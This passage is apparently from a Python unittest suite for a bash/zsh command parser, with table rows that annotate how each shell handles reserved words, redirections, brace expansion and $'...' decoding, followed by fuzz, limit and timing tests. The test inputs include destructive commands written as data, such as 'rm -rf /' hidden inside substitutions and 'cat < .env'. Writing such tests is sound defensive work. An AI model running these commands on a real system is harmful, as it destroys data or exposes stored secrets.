# bash=zsh: sudo
row("sudo $X", ["sudo $X"])
# bash=zsh: x
row("${CMD} x", ["${CMD} x"], dyn={0})
# bash=zsh: curl <x>
row("if $(curl x); then :; fi", ["$(curl x)", ":"], [(S, "curl x")], dyn={0})
# --- reserved words and compound commands ---------------------------------
# bash=zsh: rm <-rf> </>
row("{ rm -rf /; }", ["rm -rf /"])
# bash: - SYNTAX | zsh: rm <y>   (zsh-only form; None keeps it in R0/HEAD)
row("{ rm y }", None)
# bash: - out='}' | zsh: - SYNTAX
row("echo }", ["echo }"])
# bash=zsh: - out='{'
row("echo {", ["echo {"])
# bash=zsh: -
row("{ echo a; } > out", ["echo a", "> out"])
# bash=zsh: rm <x>
row("{ { rm x; }; }", ["rm x"])
# bash=zsh: - SYNTAX
row("}", None)
# bash=zsh: - SYNTAX
row("{ echo a;", None)
# bash=zsh: rm <x>
row("(rm x)", ["rm x"])
# bash=zsh: - SYNTAX
row("(rm x", None)
# bash=zsh: - SYNTAX
row("rm x)", None)
# bash=zsh: rm <x>
row("( (rm x) )", ["rm x"])
# bash=zsh: rm <x>
row("(cd . && rm x) > log", ["cd .", "rm x", "> log"])
# bash=zsh: rm <o> exit=1
row("! rm o", ["rm o"])
# bash: - exit=127 | zsh: rm <x>
row("nocorrect rm x", ["rm x"])
# bash: - exit=127 | zsh: rm <x>
row("noglob rm x", ["rm x"])
# bash=zsh: rm <x>
row("exec rm x", ["exec rm x"])
# bash=zsh: rm <x>
row("command rm x", ["command rm x"])
# bash=zsh: - exit=127
row("'if' x", ["'if' x"])
# bash=zsh: - out='if then fi'
row("echo if then fi", ["echo if then fi"])
# bash=zsh: rm <y>; rm <z>
row("if rm y; then rm z; elif rm aa; then :; else rm ab; fi", ["rm y", "rm z", "rm aa", ":", "rm ab"])
# bash=zsh: -
row("if true; then echo a; fi > out", ["true", "echo a", "> out"])
# bash=zsh: -
row("while false; do :; done", ["false", ":"])
# bash=zsh: rm <x>
row("until rm x; do :; done", ["rm x", ":"])
# bash=zsh: rm <a>; rm <b>
row("for i in a b; do rm $i; done", ["rm $i"])
# bash=zsh: rm <y>
row("for i in $(rm y); do :; done", [":"], [(S, "rm y")])
# bash=zsh: -   (no positional parameters: the body is accepted, not run)
row("for i do rm $i; done", ["rm $i"])
# bash=zsh: rm <w>
row("for ((i=0;i<1;i++)); do rm w; done", ["rm w"])
# bash: - SYNTAX | zsh: rm <a>; rm <b>
row("for i (a b) rm $i", None)
# bash: - exit=1 | zsh: -
row("select i in a; do rm x; break; done", ["rm x", "break"])
# bash=zsh: rm <p>
row("case x in x) rm p\nesac", ["rm p"])
# bash=zsh: rm <q>
row("case x in (x) rm q;; *) rm r;; esac", ["rm q", "rm r"])
# bash=zsh: - SYNTAX   (bash 3.2 lacks `;&`/`;;&`, zsh lacks `;;&`; bash >= 4 accepts both)
row("case $x in a|b) rm a;; (c) rm c;& *) rm d;;& esac", ["rm a", "rm c", "rm d"])
# bash=zsh: -
row("case x in esac", [])
# bash=zsh: - SYNTAX
row("case x in a) rm a", None)
# bash=zsh: rm <y>
row("case $(rm y) in *) :;; esac", [":"], [(S, "rm y")])
# bash=zsh: - out='esac'
row("case a in a) echo esac;; esac", ["echo esac"])
# bash=zsh: rm <q>
row("case a\nin\na) rm q\n;;\nesac", ["rm q"])
# bash=zsh: - out='case'
row("echo case", ["echo case"])
# bash=zsh: rm <v>
row("function f { rm v; }; f", ["rm v", "f"])
# bash=zsh: -
row("function f() { rm v; }", ["rm v"])
# bash: - SYNTAX | zsh: rm <y>
row("f() rm y; f", ["rm y", "f"])
# bash: - SYNTAX | zsh: rm <anon>
row("() { rm anon; }", ["rm anon"])
# bash: - SYNTAX | zsh: rm <anon2>
row("function { rm anon2; }", ["rm anon2"])
# bash=zsh: -
row("f () (rm x)", ["rm x"])
# bash=zsh: -
row("f()\n{\nrm x\n}", ["rm x"])
# bash: - SYNTAX | zsh: - exit=1
row("echo (a)", None)
# bash: - SYNTAX | zsh: rm <q>; ls <stub.log>   (zsh glob qualifier runs code)
row("ls *(e:'rm q':)", None)
# bash=zsh: rm <y> exit=1
row("[[ -n $(rm y) ]]", ["[[ -n $(rm y) ]]"], [(S, "rm y")])
# bash=zsh: - exit=1
row("[[ a < b && c > d ]]", ["[[ a < b && c > d ]]"])
# bash: rm <x> exit=1 | zsh: - exit=1
row("[[ -f <(rm x) ]]", None)
# bash=zsh: - exit=1
row("[[ a == b ]] > out", ["[[ a == b ]] > out"])
# bash=zsh: - SYNTAX
row("[[ a", None)
# bash=zsh: - SYNTAX
row("[[ a == a; ]] && rm w", None)
# bash: - SYNTAX | zsh: rm <w>
row("[[ a\n== a ]] && rm w", ["[[ a == a ]]", "rm w"])
# bash=zsh: rm <-rf> </>
row("[[ -n x ]] && echo $(rm -rf /)", ["[[ -n x ]]", "echo $(rm -rf /)"], [(S, "rm -rf /")])
# bash: - out='rm' | zsh: -
row("x=(rm t u); echo ${x[0]}", ["'x=(rm t u)'", "echo ${x[0]}"])
# bash=zsh: rm <v>
row("x=($(rm v) w)", ["'x=($(rm v) w)'"], [(S, "rm v")])
# --- operators and separators ---------------------------------------------
# bash: - SYNTAX | zsh: a; b; f; g   (bash 3.2 lacks `|&`)
row("a && b || c | d |& e & f ; g", ["a", "b", "c", "d", "e", "f", "g"],
    sep=[None, "&&", "||", "|", "|&", "&", ";"], canon="a && b || c | d |& e & f ; g")
# bash: - SYNTAX | zsh: rm <b>; a
row("a &| rm b", ["a", "rm b"], sep=[None, "&"])
# bash=zsh: a; b
row("a |\n b", ["a", "b"], sep=[None, "|"])
# bash=zsh: a; b
row("a &&\n\n b", ["a", "b"], sep=[None, "&&"])
# bash=zsh: - SYNTAX
row("a ;; b", None)
# bash=zsh: a; b
row("a\nb", ["a", "b"], sep=[None, "\n"], canon="a ; b", pos=[0, 2])
# bash=zsh: a; b
row("  a ;  b", ["a", "b"], pos=[2, 7])
# --- redirections --------------------------------------------------------
# bash=zsh: - exit=1
row("cat < .env", ["cat < .env"])
# bash=zsh: -
row("echo x > 'out file'", ["echo x > 'out file'"])
# bash=zsh: cmd
row("cmd 2>&1", ["cmd 2>& 1"])
# bash=zsh: cmd
row("cmd >&2", ["cmd >& 2"])
# bash=zsh: cmd
row("cmd &> f", ["cmd &> f"])
# bash: - SYNTAX | zsh: cmd
row("cmd &>> f", ["cmd &>> f"])
# bash=zsh: cmd
row("cmd <> f", ["cmd <> f"])
# bash: cmd <{fd}> | zsh: cmd   (bash 3.2 has no {var} redirections; bash >= 4.1 does)
row("cmd {fd}>f", ["cmd {fd}> f"])
# bash=zsh: cat <a2>; cat <x>
row("cat a2>x; cat x", ["cat a2 > x", "cat x"])
# bash: cmd | zsh: cmd <10>   (zsh takes only a one-digit fd prefix)
row("cmd 10>f", ["cmd 10> f"])
# bash=zsh: - SYNTAX
row("cmd >", None)
# bash=zsh: - SYNTAX
row("cmd >\nx", None)
# bash=zsh: -
row("exec 3<&-", ["exec 3<& -"])
# bash: - SYNTAX | zsh: rm <s> out='c'
row("echo a >| b; echo c 2>>b; echo d &> b; echo e &>> b; rm s <> b",
    ["echo a >| b", "echo c 2>> b", "echo d &> b", "echo e &>> b", "rm s <> b"])
# bash=zsh: -
row("> out echo hi", ["> out echo hi"])
# bash=zsh: cmd
row("cmd >'$(rm x)'", ["cmd > '$(rm x)'"])
# --- variants (INV-11) ----------------------------------------------------
# bash=zsh: - out='a b'
row("echo {a,b}", ["echo {a,b}", ("echo a b", 0)])
# bash=zsh: - out='a b c'
row("echo {a..c}", ["echo {a..c}", ("echo a b c", 0)])
# bash=zsh: x <1> <2> <3>
row("x {1..3}", ["x {1..3}", ("x 1 2 3", 0)])
# bash=zsh: x <3> <2> <1>
row("x {3..1}", ["x {3..1}", ("x 3 2 1", 0)])
# bash: x <{1..10..5}> | zsh: x <1> <6>   (step form: bash >= 4)
row("x {1..10..5}", ["x {1..10..5}", ("x 1 6", 0)])
# bash=zsh: - out='{a}'
row("echo {a}", ["echo {a}"])
# bash=zsh: - out='{}'
row("echo {}", ["echo {}"])
# bash=zsh: - out='{a,b}'
row("echo '{a,b}'", ["echo '{a,b}'"])
# bash=zsh: x <xay> <xby> <xcy>
row("x x{a,{b,c}}y", ["x x{a,{b,c}}y", ("x xay xby xcy", 0)])
# bash=zsh: x <ac> <ad> <bc> <bd>
row("x {a,b}{c,d}", ["x {a,b}{c,d}", ("x ac ad bc bd", 0)])
# bash=zsh: x <a> <b>
row("x ${y}{a,b}", ["x ${y}{a,b}", ("x ${y}a ${y}b", 0)])
# bash=zsh: x <1> <2> ... <100>   (more than 64 words -> None by INV-11)
row("x {1..100}", None)
# bash=zsh: x <a> <b> <c> <d> <e> <f> <g> <h> <i> <j> <k> <l> <m> <n>
row("x {a,b} {c,d} {e,f} {g,h} {i,j} {k,l} {m,n}",
    ["x {a,b} {c,d} {e,f} {g,h} {i,j} {k,l} {m,n}", ("x a b c d e f g h i j k l m n", 0)])
# bash: - exit=127 | zsh: rm <-rf> </> <x>
row("=rm -rf {/,x}", ["=rm -rf {/,x}", ("=rm -rf / x", 0), ("rm -rf {/,x}", 0), ("rm -rf / x", 0)])
# bash: - exit=127 | zsh: rm <$a>
row('=rm $"a"', ["=rm a", ("rm a", 0), ("=rm '$a'", 0), ("rm '$a'", 0)])
# bash=zsh: x <a> <b>; y <c> <d>
row("x {a,b}; y {c,d}", ["x {a,b}", ("x a b", 0), "y {c,d}", ("y c d", 2)])
# bash=zsh: - out='a=b'
row("echo a=b", ["echo a=b"])
# bash: - out='==' | zsh: - exit=1
row("echo ==", ["echo =="])
# bash: - out='a b' | zsh: - out='$a b'
row('echo $"a b"', ["echo 'a b'", ("echo '$a b'", 0)])
# bash: - | zsh: - out='$'
row('echo $"$x"', ['echo "$x"', ("echo '$'\"$x\"", 0)])
# bash: rm <ad> out='a\nb' | zsh: rm <ad> out='$a\nb'
row('echo $"a\nb" ; rm ad', ["echo 'a b'", ("echo '$a b'", 0), "rm ad"], ml={0: ("a\nb",), 1: ("a\nb",)})
# --- $'...' decoding ---------------------------------------------------------
# bash: x <AA\\u0042> | zsh: x <AAB>   (bash 3.2 lacks \u; bash >= 4.2 decodes it)
row("x $'\\x41\\101\\u0042'", ["x AAB"])
# bash=zsh: x <a'b>
row("x $'a\\'b'", ["x 'a'\"'\"'b'"])
# bash=zsh: x <a\tb>
row("x $'a\\tb'", ["x 'a\tb'"])
# bash=zsh: x <\x1b[1m>
row("x $'\\e[1m'", ["x '\x1b[1m'"])
# bash: x <\\u00e9> | zsh: - exit=1   (zsh: not encodable in the C locale of env -i)
row("x $'\\u00e9'", ["x '\xe9'"])
# bash=zsh: x <a>
row("x $'a\\x00b'", ["x a"])
# bash: x <\\x> | zsh: x <>
row("x $'\\x'", None)
# bash: x <\x01> | zsh: x <cA>
row("x $'\\cA'", ["x '\x01'"])
# bash: x <\x07\x08\x1b\x0c\x0b\r\\"?\\U0001F600> | zsh: - exit=1
row("x $'\\a\\b\\E\\f\\v\\r\\\\\\\"\\?\\U0001F600'", ["x '\x07\x08\x1b   \\\"?\U0001F600'"],
    ml={0: ("\x07\x08\x1b\x0c\x0b\r\\\"?\U0001F600",)})
# bash=zsh: - SYNTAX
row("x $'unterminated", None)
# --- unsupported input -> None (INV-06) -------------------------------------
# bash=zsh: - SYNTAX
row("echo 'unterminated", None)
# bash=zsh: - SYNTAX
row('echo "unterminated', None)
# bash=zsh: - SYNTAX
row("echo $(unterminated", None)
# bash: - SYNTAX | zsh: - exit=1
row("echo ${x", None)
# bash=zsh: - SYNTAX
row("echo `x", None)
# bash=zsh: n/a (NUL cannot be passed via -c)
row("echo a\x00b", None)
# bash=zsh: - out='a\x01b'
row("echo a\x01b", None)
# bash=zsh: - out='a\x1bb'
row("echo a\x1bb", None)
# bash=zsh: - out='a\x7fb'
row("echo a\x7fb", None)
# bash: rm <y> | zsh: rm <y> <>
row("rm y \\", None)
# bash: - SYNTAX | zsh: - exit=1
row("foo(bar)", None)
# bash: rm <x> | zsh: - out='$(rm x)'
row('echo "$\\\n(rm x)"', None)
# bash=zsh: rm <x>
row("echo $\\\n(rm x)", None)


def _expect(units):
    return [(u, None) if isinstance(u, str) else u for u in units]


def _reparsable(r):
    return not r.heredoc_body_lines and "<<" not in r.canonical and not sp._RE_BAD_CTRL.search(r.canonical)


class TableTest(unittest.TestCase):
    def test_table_size(self):
        self.assertGreaterEqual(len(ROWS), 200)

    def test_rows(self):
        for text, units, nested, extra in ROWS:
            with self.subTest(text=text):
                self._check(text, units, nested, extra)

    def _check(self, text, units, nested, extra):
        r = parse_command(text)
        if units is None:
            self.assertIsNone(r)
            return
        self.assertIsInstance(r, ParsedCommand)
        self.assertEqual([(u.text, u.variant_of) for u in r.units], _expect(units))
        self.assertEqual(sorted((n.kind, n.text) for n in r.nested), sorted(nested))
        self.assertIsInstance(r.heredoc_body_lines, frozenset)
        self.assertEqual(r.heredoc_body_lines, frozenset(extra.get("H", ())))
        nl = {
            i: tuple(v for v in u.multiline if re.search("[\n\r\x0b\x0c\x85\u2028\u2029]", v))
            for i, u in enumerate(r.units)
        }
        self.assertEqual({i: v for i, v in nl.items() if v}, extra.get("ml", {}))
        self.assertEqual({i for i, u in enumerate(r.units) if u.dyn_head}, extra.get("dyn", set()))
        if "sep" in extra:
            self.assertEqual([u.sep_before for u in r.units], extra["sep"])
        if "canon" in extra:
            self.assertEqual(r.canonical, extra["canon"])
        if "pos" in extra:
            self.assertEqual([u.pos for u in r.units], extra["pos"])

    def test_units_pass_shlex(self):
        for text, *_ in ROWS:
            r = parse_command(text)
            for u in r.units if r else ():
                with self.subTest(text=text, unit=u.text):
                    shlex.split(u.text)

    def test_canonical_idempotent(self):
        # parse(canonical) yields the same original units. Skipped: heredoc
        # inputs (canonical drops the body, so the operator has none) and
        # canonicals holding a control character decoded from `$'...'`
        # (outside the INV-06 input domain, so parse returns None).
        for text, *_ in ROWS:
            r = parse_command(text)
            if r is None or not _reparsable(r):
                continue
            with self.subTest(text=text):
                r2 = parse_command(r.canonical)
                self.assertIsNotNone(r2)
                self.assertEqual(
                    [u.text for u in r2.units if u.variant_of is None],
                    [u.text for u in r.units if u.variant_of is None],
                )

    def test_nested_sorted_by_pos(self):
        r = parse_command('echo "$(echo "a\'b")"; echo $(rm -rf /) `rm b`')
        self.assertEqual([n.pos for n in r.nested], sorted(n.pos for n in r.nested))
        self.assertEqual([n.kind for n in r.nested], [S, S, B])


class LimitsTest(unittest.TestCase):
    def test_depth_32_ok_33_none(self):
        shapes = [
            lambda n: "echo " + "$(echo " * n + "x" + ")" * n,
            lambda n: "( " * n + "rm x" + " )" * n,
            lambda n: "{ " * n + "rm x; " + "} " * n,
        ]
        for make in shapes:
            with self.subTest(shape=make(2)):
                self.assertIsNotNone(parse_command(make(32)))
                self.assertIsNone(parse_command(make(33)))

    def test_variant_limit(self):
        self.assertIsNotNone(parse_command(";".join(["x {a,b}"] * 64)))
        self.assertIsNone(parse_command(";".join(["x {a,b}"] * 65)))
        self.assertIsNotNone(parse_command("x {1..64}"))
        self.assertIsNone(parse_command("x {1..65}"))

    def test_non_str_input(self):
        for value in (None, 123, b"echo a", ["echo"], 1.5):
            with self.subTest(value=value):
                self.assertIsNone(parse_command(value))
                self.assertIsNone(extract_substitutions(value))

    def test_control_characters(self):
        allowed = "\t\n\r\x0b\x0c"
        for code in list(range(0x20)) + [0x7F]:
            ch = chr(code)
            with self.subTest(code=code):
                r = parse_command("echo a" + ch + "b")
                if ch in allowed:
                    self.assertIsNotNone(r)
                else:
                    self.assertIsNone(r)

    def test_internal_exception_returns_none(self):
        original = sp._Parser.parse_list

        def boom(self, closer):
            raise RuntimeError("internal")

        sp._Parser.parse_list = boom
        try:
            # "$a" is outside the simple-command fast path, so the general
            # parser (patched here) runs.
            self.assertIsNone(parse_command("echo $a"))
        finally:
            sp._Parser.parse_list = original
        self.assertIsNotNone(parse_command("echo $a"))

    def test_fast_path_matches_general_parser(self):
        for text in ("echo a", "  git commit -m 'a b'\t", 'grep -rn "TODO" src', "'time' x", "'' x", "x '='"):
            with self.subTest(text=text):
                fast = sp._parse_simple(text)
                self.assertIsNotNone(fast)
                ctx = sp._Ctx()
                recs = sp._Parser(text, ctx).parse_list(None)
                self.assertEqual([(r[0], r[1]) for r in recs], [(u.text, u.pos) for u in fast.units])
                self.assertEqual(fast.canonical, fast.units[0].text)
                self.assertEqual((fast.nested, ctx.nested), ([], []))
        for text in ("time x", "=rm x", "a{b,c}", "if x", "a # c", "a 'b'c", "a\nb", "echo $a", "a;b"):
            with self.subTest(text=text):
                self.assertIsNone(sp._parse_simple(text))


class BodyValuesTest(unittest.TestCase):
    """Unit.multiline holds every word value with a quote, a backslash or a
    newline-like character (also on the simple-command fast path)."""

    def test_values(self):
        cases = [
            ("sh -c 'echo \"a b\"'", ('echo "a b"',)),
            ('sh -c "echo \'a b\'"', ("echo 'a b'",)),
            ("sh -c $'sh -c \\'x y\\''", ("sh -c 'x y'",)),
            ("sh -c 'a\\qb'", ("a\\qb",)),
            ("sh -c 'a\nb'", ("a\nb",)),
            ("sh -c 'plain words'", ()),
            ("echo plain", ()),
        ]
        for text, expected in cases:
            with self.subTest(text=text):
                r = parse_command(text)
                self.assertEqual(r.units[0].multiline, expected)

    def test_fast_path_equals_general_parser(self):
        for text in ("sh -c 'echo \"a b\"'", 'x "a\'b" \'c\\d\'', "a 'b c'"):
            fast = sp._parse_simple(text)
            self.assertIsNotNone(fast, text)
            recs = sp._Parser(text, sp._Ctx()).parse_list(None)
            self.assertEqual(fast.units[0].multiline, recs[0][4], text)


class InterfaceTest(unittest.TestCase):
    def test_all(self):
        self.assertEqual(
            set(sp.__all__), {"Unit", "Nested", "ParsedCommand", "parse_command", "extract_substitutions"}
        )

    def test_frozen_fields(self):
        # namedtuples: immutable records (assignment raises AttributeError).
        self.assertEqual(
            list(Unit._fields),
            ["text", "pos", "sep_before", "variant_of", "dyn_head", "multiline"],
        )
        self.assertEqual(list(Nested._fields), ["text", "kind", "pos"])
        self.assertEqual(
            list(ParsedCommand._fields),
            ["units", "nested", "heredoc_body_lines", "canonical"],
        )
        u = parse_command("echo a").units[0]
        with self.assertRaises(AttributeError):
            u.text = "x"

    def test_sep_values(self):
        allowed = {None, ";", "&", "&&", "||", "|", "|&", "\n"}
        for text, *_ in ROWS:
            r = parse_command(text)
            for u in r.units if r else ():
                self.assertIn(u.sep_before, allowed, text)

    def test_kinds(self):
        kinds = {S, B, P, A, HS}
        for text, *_ in ROWS:
            r = parse_command(text)
            for nd in r.nested if r else ():
                self.assertIn(nd.kind, kinds, text)


class ExtractSubstitutionsTest(unittest.TestCase):
    TABLE = [
        ("echo $(rm -rf /)", ["rm -rf /"]),
        ("echo `rm x`", ["rm x"]),
        ("cat <(a) >(b)", ["a", "b"]),
        ("echo '$(no)'", []),
        ('echo "$(yes)"', ["yes"]),
        ("echo \\$(no)", []),
        ("echo $(a $(b) c)", ["a $(b) c", "b"]),
        ("echo $(a", None),
        ("echo 'x", None),
        ('echo "x', None),
        ("echo `a", None),
        ("echo $((1+2))", ["(1+2)"]),
        ("echo $(echo ')')", ["echo ')'"]),
        ('echo "$(echo ")")"', ['echo ")"']),
        ("plain words", []),
        ("", []),
        ("echo ${x:-$(rm y)}", ["rm y"]),
        ("echo a)", []),
        ("echo $(a) `b` <(c)", ["a", "b", "c"]),
        ('echo "`rm x`"', ["rm x"]),
        ("echo `echo \\`rm m\\``", ["echo `rm m`"]),
    ]

    def test_table(self):
        for text, expected in self.TABLE:
            with self.subTest(text=text):
                self.assertEqual(extract_substitutions(text), expected)


_ALPHABET = "'\"\\$`()<>;&|#{} =\n\t\r"
_WORDS = ["rm", "-rf", "/", "git", "push", "echo", "a", "x", "EOF", "<<", "<<'EOF'", "$(", ")",
          "${", "}", "$((", "))", "[[", "]]", "case", "in", "esac", "if", "then", "fi", "for",
          "do", "done", "{", "}", "time", "coproc", "=rm", "{a,b}", "$'\\n'", '$"x"', "<<<",
          "2>", ">|", "&>", "\\\n", "#", "!", "function", "f()", "x=(", "`", "'", '"']


def _fuzz_inputs(seed=1234, count=6000):
    rng = random.Random(seed)
    for _ in range(count):
        parts = []
        for _ in range(rng.randint(1, 14)):
            if rng.random() < 0.5:
                parts.append(rng.choice(_WORDS))
            else:
                parts.append("".join(rng.choice(_ALPHABET) for _ in range(rng.randint(1, 4))))
            parts.append(rng.choice([" ", "", " ", "\n"]))
        yield "".join(parts)


class FuzzTest(unittest.TestCase):
    def test_fuzz(self):
        parsed = 0
        for text in _fuzz_inputs():
            # The internal parser may only signal "unsupported"; any other
            # exception is a bug that parse_command would hide as None.
            try:
                sp._Parser(text, sp._Ctx()).parse_list(None)
            except sp._Unsupported:
                pass
            except Exception as exc:  # pragma: no cover - failure path
                self.fail(f"{type(exc).__name__}: {exc} on {text!r}")
            extract_substitutions(text)
            r = parse_command(text)
            if r is None:
                continue
            parsed += 1
            for u in r.units:
                try:
                    shlex.split(u.text)
                except ValueError as exc:  # pragma: no cover - failure path
                    self.fail(f"shlex {exc} on unit {u.text!r} of {text!r}")
            if _reparsable(r):
                r2 = parse_command(r.canonical)
                self.assertEqual(
                    None if r2 is None else [u.text for u in r2.units if u.variant_of is None],
                    [u.text for u in r.units if u.variant_of is None],
                    text,
                )
        # The fuzz must exercise successful parses, not only rejections.
        self.assertGreater(parsed, 300)


class WrapperOperandTest(unittest.TestCase):
    """dyn_head is the command word; a wrapper's own operands are not."""

    def _dyn(self, text):
        return [u.dyn_head for u in parse_command(text).units]

    def test_wrapper_operands_are_not_the_command_word(self):
        for text in (
            'timeout "$T" make', "timeout 5 make", 'timeout -k "$K" 5 make', 'timeout --signal="$S" 5 make',
            'nice -n "$N" make', 'ionice -c "$C" make', 'xargs -n "$N" echo', 'command -v "$tool"',
            'command -V "$tool"', 'env -u "$V" make', 'stdbuf -o "$M" make',
        ):
            with self.subTest(text=text):
                self.assertEqual(self._dyn(text), [False])

    def test_a_dynamic_command_word_after_a_wrapper_is_still_flagged(self):
        for text in (
            'timeout 5 "$cmd" arg', 'nice -n 5 $CMD', 'timeout "$T" "$cmd"', 'xargs -n 1 $CMD', 'command "$tool" x',
            'env -u X $CMD',
        ):
            with self.subTest(text=text):
                self.assertEqual(self._dyn(text), [True])


class TimeTest(unittest.TestCase):
    # Relative bound: every 4096-char shape parses within RATIO x the
    # same-run parse of a plain 4096-char command (no braces, no quotes).
    RATIO = 2.0  # measured 0.1-1.1
    BRACE_RATIO = 1.7  # measured 1.2-1.4; 2.0 without the single-group fast path
    BASE = "echo $a "

    SHAPES = [
        "git commit -m 'x y' ",
        "echo $(echo $(echo a)) ; ",
        "git commit -m \"$(cat <<'EOF'\nmsg line\nEOF\n)\"\n",
        "a ",
        'echo "a\nb" ; ',
        "x {a,b} ; ",
        "{",
        "${",
        "\\\n",
        "((",
        "`",
        "x{a,b}",
        "[[ ",
        "$'\\x41",
    ]

    SHAPES += ["{{{a,b}}}", "$((", "$((a ", "$(( $(( ", "$( $(("]

    @classmethod
    def _fill(cls, shape):
        return (shape * (4096 // len(shape) + 1))[:4096]

    def _best(self, text, n=5):
        return min(self._time(text) for _ in range(n))

    def test_4096_chars(self):
        base = self._best(self._fill(self.BASE))
        for shape in self.SHAPES:
            with self.subTest(shape=shape):
                self.assertLess(self._best(self._fill(shape)), self.RATIO * base)

    def test_brace_words_linear(self):
        base = self._best(self._fill(self.BASE))
        for text in (" ".join(["x{a,b}"] * 683)[:4096], "{" * 2000 + "a,b" + "}" * 2000):
            with self.subTest(text=text[:12]):
                self.assertLess(self._best(text), self.BRACE_RATIO * base)

    def test_arith_retry_nest(self):
        # An arithmetic attempt that fails is re-read as a substitution: the
        # nesting must not multiply the work.
        text = "$((" + "a " * 1700 + ") )"
        while len("$((" + text + ") )") <= 4096:
            text = "$((" + text + ") )"
            with self.subTest(length=len(text)):
                self.assertLess(self._best(text, 3), 0.05)  # measured 3-14 ms

    def test_deep_case_nest(self):
        base = self._best(self._fill(self.BASE))
        text = "case x in a) " * 300 + "true" + " ;; esac" * 300
        self.assertLess(self._best(text[:4096]), self.RATIO * base)
        for depth in (40, 200):
            text = "case x in a) " * depth + "true" + " ;; esac" * depth
            parse_command(text)  # depth budget: no RecursionError

    @staticmethod
    def _time(text):
        t0 = time.perf_counter()
        parse_command(text)
        extract_substitutions(text)
        return time.perf_counter() - t0


if __name__ == "__main__":
    unittest.main()
